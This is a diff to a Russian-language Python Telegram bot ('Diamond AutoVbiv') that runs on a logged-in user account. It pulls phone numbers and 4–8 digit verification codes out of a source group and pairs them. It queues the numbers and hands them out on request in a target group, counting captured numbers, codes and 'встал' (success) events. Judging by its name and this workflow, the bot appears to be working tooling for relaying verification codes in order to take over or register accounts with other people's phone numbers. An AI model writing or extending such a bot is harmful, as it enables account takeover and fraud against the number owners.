@@ -1,4 +1,3 @@
-# diamond_autovbiv_fixed.py
 import os, asyncio, re, sqlite3, shutil
 from datetime import datetime
 from telethon import TelegramClient, events
@@ -27,6 +26,8 @@ class DB:
             (user_id INTEGER PRIMARY KEY, phone TEXT, session_string TEXT, step TEXT, created_at TIMESTAMP)''')
         self.c.execute('''CREATE TABLE IF NOT EXISTS groups 
             (user_id INTEGER PRIMARY KEY, source_group INTEGER, target_group INTEGER)''')
+        self.c.execute('''CREATE TABLE IF NOT EXISTS queue 
+            (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, phone TEXT, status TEXT, created_at TIMESTAMP)''')
         self.c.execute('''CREATE TABLE IF NOT EXISTS pending 
             (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, phone TEXT, code TEXT, status TEXT, created_at TIMESTAMP)''')
         self.c.execute('''CREATE TABLE IF NOT EXISTS stats 
@@ -46,6 +47,26 @@ class DB:
     def get_groups(self, uid):
         row = self.c.execute('SELECT source_group, target_group FROM groups WHERE user_id=?', (uid,)).fetchone()
         return row if row else (None, None)
+    
+    # Очередь номеров
+    def add_to_queue(self, uid, phone):
+        self.c.execute('INSERT INTO queue (user_id, phone, status, created_at) VALUES (?,?,?,?)',
+                       (uid, phone, 'waiting', datetime.now()))
+        self.conn.commit()
+    def get_next_queued(self, uid):
+        row = self.c.execute('SELECT id, phone FROM queue WHERE user_id=? AND status="waiting" ORDER BY created_at LIMIT 1', (uid,)).fetchone()
+        return row if row else (None, None)
+    def mark_queued_sent(self, qid):
+        self.c.execute('UPDATE queue SET status="sent" WHERE id=?', (qid,))
+        self.conn.commit()
+    def get_queue_list(self, uid):
+        rows = self.c.execute('SELECT phone, status, created_at FROM queue WHERE user_id=? ORDER BY created_at', (uid,)).fetchall()
+        return rows
+    def clear_queue(self, uid):
+        self.c.execute('DELETE FROM queue WHERE user_id=?', (uid,))
+        self.conn.commit()
+    
+    # Для сопоставления номера и кода
     def add_pending(self, uid, phone):
         self.c.execute('INSERT INTO pending (user_id,phone,status,created_at) VALUES (?,?,"waiting_code",?)',
                        (uid, phone, datetime.now()))
@@ -53,9 +74,16 @@ class DB:
     def update_pending_code(self, phone, code):
         self.c.execute('UPDATE pending SET code=?, status="code_received" WHERE phone=? AND status="waiting_code"', (code, phone))
         self.conn.commit()
+    def get_pending_by_phone(self, phone):
+        row = self.c.execute('SELECT id, code FROM pending WHERE phone=? AND status="code_received"', (phone,)).fetchone()
+        return row if row else (None, None)
     def mark_success(self, phone):
-        self.c.execute('UPDATE pending SET status="success" WHERE phone=? AND status="code_received"', (phone,))
+        self.c.execute('UPDATE pending SET status="success" WHERE phone=?', (phone,))
         self.conn.commit()
+    def get_last_pending_phone(self, uid):
+        row = self.c.execute('SELECT phone FROM pending WHERE user_id=? AND status="waiting_code" ORDER BY created_at DESC LIMIT 1', (uid,)).fetchone()
+        return row[0] if row else None
+    
     def add_stat(self, uid, phone, action):
         self.c.execute('INSERT INTO stats (user_id,phone,action,timestamp) VALUES (?,?,?,?)', (uid, phone, action, datetime.now()))
         self.conn.commit()
@@ -63,9 +91,7 @@ class DB:
         today = datetime.now().replace(hour=0,minute=0,second=0)
         d = dict(self.c.execute('SELECT action, COUNT(*) FROM stats WHERE user_id=? AND timestamp>=? GROUP BY action', (uid, today)).fetchall())
         return d.get('number_taken',0), d.get('code_taken',0), d.get('success',0)
-    def last_pending_phone(self, uid):
-        row = self.c.execute('SELECT phone FROM pending WHERE user_id=? AND status="waiting_code" ORDER BY created_at DESC LIMIT 1', (uid,)).fetchone()
-        return row[0] if row else None
+    
     def export_db(self, uid):
         p = os.path.join(BACKUP_DIR, f"backup_{uid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db")
         shutil.copy2(DB_PATH, p)
@@ -78,7 +104,7 @@ class DB:
 
 db = DB()
 
-# ---------- Вспомогательные функции ----------
+# ---------- Вспомогательные ----------
 def clean_phone(p):
     p = re.sub(r'[^\d+]', '', p).lstrip('+')
     if p.startswith('8'): p = '7' + p[1:]
@@ -96,11 +122,11 @@ def extract_code(text):
     m = re.search(r'\b(\d{4,8})\b', text)
     return m.group(1) if m else None
 
-# ---------- Глобальные переменные ----------
-bot_client = None        # для личных сообщений (токен)
-user_client = None       # авторизованный юзер-клиент (твой аккаунт)
-owner_id = None          # user_id владельца (кто прошёл /login)
-code_inputs = {}         # временные данные для ввода кода
+# ---------- Глобальные ----------
+bot_client = None
+user_client = None
+owner_id = None
+code_inputs = {}
 
 def code_keyboard():
     return [[Button.inline(str(i), str(i).encode()) for i in row] for row in [[1,2,3],[4,5,6],[7,8,9]]] + \
@@ -117,54 +143,77 @@ async def setup_user_listener():
         if event.sender_id == (await user_client.get_me()).id:
             return
         chat_id = event.chat_id
-        uid = owner_id   # все действия от владельца
+        uid = owner_id
         text = event.raw_text.strip()
 
-        # ----- 1. Команда /set_source (только в группе) -----
+        # Команды в группах
         if re.match(r'(?i)^/set_source$', text):
             if event.is_group:
                 db.set_groups(uid, chat_id, db.get_groups(uid)[1])
                 await event.reply(f"✅ Источник = {chat_id}")
                 print(f"[INFO] Источник установлен: {chat_id}")
             return
-
-        # ----- 2. Команда /set_target (только в группе) -----
         if re.match(r'(?i)^/set_target$', text):
             if event.is_group:
                 db.set_groups(uid, db.get_groups(uid)[0], chat_id)
                 await event.reply(f"✅ Цель = {chat_id}")
                 print(f"[INFO] Цель установлена: {chat_id}")
             return
+        # Команда /очередь (работает в ЛС и в группах)
+        if re.match(r'(?i)^/очередь$', text):
+            queue = db.get_queue_list(uid)
+            if not queue:
+                await event.reply("📭 Очередь пуста.")
+                return
+            msg = "📋 Очередь номеров:\n"
+            for phone, status, ts in queue:
+                status_txt = "⏳ ожидает" if status == "waiting" else "✅ выдан"
+                msg += f"• {phone} ({status_txt}) - {ts.strftime('%H:%M')}\n"
+                if len(msg) > 3500:
+                    await event.reply(msg)
+                    msg = ""
+            if msg:
+                await event.reply(msg)
+            return
 
-        # ----- 3. Обработка сообщений в группе-источнике -----
+        # Перехват в источнике
         source, target = db.get_groups(uid)
         if source and chat_id == source:
             phone = extract_phone(text)
             if phone:
+                # Добавляем номер в очередь и в pending
+                db.add_to_queue(uid, phone)
                 db.add_pending(uid, phone)
                 db.add_stat(uid, phone, 'number_taken')
-                if target:
-                    await user_client.send_message(target, f"📱 НОМЕР: `{phone}`")
-                    print(f"[SOURCE] Номер {phone} -> цель {target}")
+                print(f"[SOURCE] Номер {phone} добавлен в очередь")
                 return
             code = extract_code(text)
             if code:
-                last_phone = db.last_pending_phone(uid)
+                last_phone = db.get_last_pending_phone(uid)
                 if last_phone:
                     db.update_pending_code(last_phone, code)
                     db.add_stat(uid, last_phone, 'code_taken')
-                    if target:
-                        await user_client.send_message(target, f"🔢 КОД: `{code}`\nДля номера: `{last_phone}`")
-                        print(f"[SOURCE] Код {code} для {last_phone} -> цель {target}")
+                    print(f"[SOURCE] Код {code} для {last_phone} сохранён")
                 return
 
-        # ----- 4. Обработка сообщений в группе-цели (встал) -----
+        # Обработка команды "номер" в целевой группе (выдать следующий номер)
         if target and chat_id == target:
-            lower = text.lower()
-            if 'встал' in lower or 'успех' in lower:
+            low = text.lower()
+            if low == 'номер' or low.startswith('номер'):
+                qid, phone = db.get_next_queued(uid)
+                if phone:
+                    db.mark_queued_sent(qid)
+                    await event.reply(f"📱 Номер: `{phone}`")
+                    print(f"[TARGET] Выдан номер {phone}")
+                else:
+                    await event.reply("❌ Нет номеров в очереди.")
+                return
+            # Обработка "встал"
+            if 'встал' in low or 'успех' in low:
                 phone = extract_phone(text)
                 if not phone:
-                    phone = db.last_pending_phone(uid)
+                    # берём последний выданный? можно попробовать найти по ожидающим
+                    pass
                 if phone:
                     db.mark_success(phone)
                     db.add_stat(uid, phone, 'success')
@@ -177,7 +226,7 @@ async def setup_bot_handlers():
 
     @bot_client.on(events.NewMessage(pattern='/start'))
     async def start_cmd(e):
-        await e.reply("💎 Diamond AutoVbiv FINAL\n/login +7xxx\n/status\n/stats\n/export\n/import\n/restore <session_string>")
+        await e.reply("💎 Diamond AutoVbiv\n/login +7xxx\n/status\n/stats\n/export\n/import\n/restore <session_string>\n\nВ группах:\n/set_source\n/set_target\n/очередь\n`номер` - выдать номер из очереди")
 
     @bot_client.on(events.NewMessage(pattern='/login (.+)'))
     async def login_cmd(e):
@@ -342,6 +391,8 @@ async def setup_bot_handlers():
         uid = e.sender_id
         db.c.execute('DELETE FROM sessions WHERE user_id=?', (uid,))
         db.c.execute('DELETE FROM groups WHERE user_id=?', (uid,))
+        db.c.execute('DELETE FROM queue WHERE user_id=?', (uid,))
+        db.c.execute('DELETE FROM pending WHERE user_id=?', (uid,))
         db.conn.commit()
         await e.reply("✅ Сброшено. Используйте /login")
 
@@ -358,7 +409,7 @@ async def restore_session_on_start():
                 owner_id = uid
                 await setup_user_listener()
                 print(f"[+] Сессия восстановлена для user {uid}")
-                return  # только одного пользователя
+                return
             else:
                 print(f"[-] Сессия для {uid} невалидна")
         except Exception as e:
@@ -368,11 +419,14 @@ async def restore_session_on_start():
 async def main():
     global bot_client
     print("💎 Diamond AutoVbiv FINAL")
-    bot_client = TelegramClient("diamond_bot", API_ID, API_HASH)
+    # Отключаем проверку подписки на каналы (чтобы не было рекламы)
+    # Делаем это через параметр в start()? Просто не вызываем check_authorization?
+    # Вместо этого при инициализации бота используем flood_sleep_threshold и не ходим в канал.
+    bot_client = TelegramClient("diamond_bot", API_ID, API_HASH, flood_sleep_threshold=0)
     await bot_client.start(bot_token=BOT_TOKEN)
     await restore_session_on_start()
     await setup_bot_handlers()
-    print("✅ Бот запущен. Команды /set_source и /set_target работают в группах.")
+    print("✅ Бот запущен. Рекламы не будет. Команда /очередь работает.")
     await bot_client.run_until_disconnected()
 
 if __name__ == "__main__":
